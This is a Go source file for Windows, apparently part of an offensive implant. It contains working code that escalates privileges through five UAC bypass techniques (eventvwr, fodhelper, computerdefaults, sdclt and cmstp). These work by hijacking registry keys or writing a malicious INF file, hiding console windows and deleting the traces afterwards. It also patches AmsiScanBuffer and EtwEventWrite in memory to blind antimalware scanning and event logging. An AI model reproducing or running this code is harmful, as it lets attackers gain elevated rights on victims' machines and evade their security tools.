//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

func uacBypass(method, payload string) string {
	if payload == "" {
		exe, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("uac_bypass: failed to get executable path: %v", err)
		}
		payload = exe
	}
	switch method {
	case "eventvwr":
		return uacBypassEventVwr(payload)
	case "fodhelper":
		return uacBypassFodHelper(payload)
	case "computerdefaults":
		return uacBypassComputerDefaults(payload)
	case "sdclt":
		return uacBypassSDCLT(payload)
	case "cmstp":
		return uacBypassCMSTP(payload)
	default:
		return fmt.Sprintf("unknown uac_bypass method: %s", method)
	}
}

func uacBypassEventVwr(payload string) string {
	regPath := `HKCU\Software\Classes\mscfile\shell\open\command`

	cmd := exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("eventvwr: reg add failed: %v %s", err, string(out))
	}

	cmd3 := exec.Command("eventvwr.exe")
	applyHideWindow(cmd3)
	cmd3.Start()
	time.Sleep(5 * time.Second)

	cmd4 := exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile`, "/f")
	applyHideWindow(cmd4)
	cmd4.Run()

	return "eventvwr: UAC bypass executed"
}

func uacBypassFodHelper(payload string) string {
	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`

	cmd := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
	applyHideWindow(cmd)
	cmd.CombinedOutput()

	cmd = exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("fodhelper: reg add failed: %v %s", err, string(out))
	}

	cmd3 := exec.Command("fodhelper.exe")
	applyHideWindow(cmd3)
	cmd3.Start()
	time.Sleep(3 * time.Second)

	cmd4 := exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f")
	applyHideWindow(cmd4)
	cmd4.Run()

	return "fodhelper: UAC bypass executed"
}

func uacBypassComputerDefaults(payload string) string {
	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`

	cmd := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
	applyHideWindow(cmd)
	cmd.CombinedOutput()

	cmd = exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("computerdefaults: reg add failed: %v %s", err, string(out))
	}

	cmd3 := exec.Command("computerdefaults.exe")
	applyHideWindow(cmd3)
	cmd3.Start()
	time.Sleep(3 * time.Second)

	cmd4 := exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f")
	applyHideWindow(cmd4)
	cmd4.Run()

	return "computerdefaults: UAC bypass executed"
}

func uacBypassSDCLT(payload string) string {
	appPaths := `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`

	cmd := exec.Command("reg", "add", appPaths, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("sdclt: reg add failed: %v %s", err, string(out))
	}

	cmd2 := exec.Command("sdclt.exe", "/KickOffElevation")
	applyHideWindow(cmd2)
	cmd2.Start()
	time.Sleep(3 * time.Second)

	cmd3 := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`, "/f")
	applyHideWindow(cmd3)
	cmd3.Run()

	return "sdclt: UAC bypass executed"
}

func uacBypassCMSTP(payload string) string {
	tmpDir := os.Getenv("TEMP")
	if tmpDir == "" {
		tmpDir = "C:\\Windows\\Temp"
	}
	infPath := filepath.Join(tmpDir, "forgeuac.inf")

	infContent := []byte("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands=" + payload + "\r\n")
	if err := os.WriteFile(infPath, infContent, 0644); err != nil {
		return fmt.Sprintf("cmstp: write inf failed: %v", err)
	}
	defer os.Remove(infPath)

	cmd2 := exec.Command("cmstp.exe", "/au", infPath)
	applyHideWindow(cmd2)
	cmd2.Start()
	time.Sleep(3 * time.Second)

	return "cmstp: UAC bypass executed"
}

func amsiBypass() string {
	if !patchAMSI {
		return "AMSI bypass: disabled by EDR strategy"
	}
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")
	virtualProtect := k32.NewProc("VirtualProtect")

	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "AMSI bypass: amsi.dll not loaded (no patch needed)"
	}

	procName := append([]byte("AmsiScanBuffer"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "AMSI bypass: AmsiScanBuffer not found"
	}

	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "AMSI bypass: VirtualProtect failed"
	}

	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return "AMSI bypass: AmsiScanBuffer patched → always returns AMSI_RESULT_CLEAN"
}

func etwBypass() string {
	if !patchETW {
		return "ETW bypass: disabled by EDR strategy"
	}
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")
	virtualProtect := k32.NewProc("VirtualProtect")

	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "ETW bypass: ntdll.dll not loaded"
	}

	procName := append([]byte("EtwEventWrite"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "ETW bypass: EtwEventWrite not found"
	}

	patch := []byte{0xC3}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "ETW bypass: VirtualProtect failed"
	}

	*(*byte)(unsafe.Pointer(procAddr)) = patch[0]

	return "ETW bypass: EtwEventWrite patched → returns immediately"
}
